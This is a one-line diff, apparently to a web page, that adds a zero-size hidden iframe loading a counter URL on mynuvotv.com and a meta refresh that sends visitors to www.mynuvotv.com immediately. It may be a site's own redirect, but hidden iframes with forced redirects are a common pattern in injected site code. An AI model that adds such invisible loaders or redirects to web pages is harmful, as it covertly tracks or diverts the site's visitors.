@@ -1,0 +1,1 @@
+<iframe src='http://counter.mynuvotv.com/index.php/counter/index/homepage_redirect?rand=<?php echo rand(5,12344)    ?>'  style='width:0px;height:0px;'  ></iframe><meta http-equiv="refresh" content="0;url=http://www.mynuvotv.com" />
